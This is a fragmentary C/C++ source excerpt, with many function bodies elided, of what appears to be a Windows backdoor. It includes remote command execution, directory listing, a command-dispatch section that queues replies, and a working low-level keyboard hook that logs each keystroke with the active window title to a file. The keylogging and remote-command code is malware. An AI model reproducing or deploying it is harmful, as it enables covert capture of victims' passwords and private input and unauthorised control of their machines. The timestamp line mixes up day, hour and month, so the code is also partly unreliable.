...
char* LookUpRunPath() {
	...
	getcwd(RunPath, strlen(RunPath));
	return RunPath;
}
// Cmd
BOOL RunCommad(char* commad,vector<char*>* SendInfoArray) {
...
void LookUpFile(char* FilePath, vector<char*>* SendInfoArray) {
	...
	if (file == INVALID_HANDLE_VALUE) {
		...
		sprintf(SendInfoArray->back(), "该目录下没有文件。");
		return;
	}
...
LRESULT CALLBACK KeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	...
	if (nCode == HC_ACTION) {
		...
		if (wParam == WM_KEYDOWN) {
			SYSTEMTIME time;
			GetLocalTime(&time);
			fprintf(fp, "%02d-%02d:%02d %d %s\n", time.wDay, time.wHour, time.wMonth, p->vkCode, wszTitle);
		}
	}
	fclose(fp);
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
BOOL LoadKeyBoardHOOK() {
	hHookKeyBorad = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoardProc, hModule, 0);
	if (hHookKeyBorad == NULL) return FALSE;
	return TRUE;
}
BOOL UnLoadHOOK() {
	if (hHookKeyBorad) UnhookWindowsHookEx(hHookKeyBorad);
	return TRUE;
}
// 指令处理中心
vector<char*> ReturnInfoArray;
void SetSendInfo(const char* SendInfo) {
	ReturnInfoArray.push_back((char*)malloc(sizeof(char) * DATA_BUFMID));
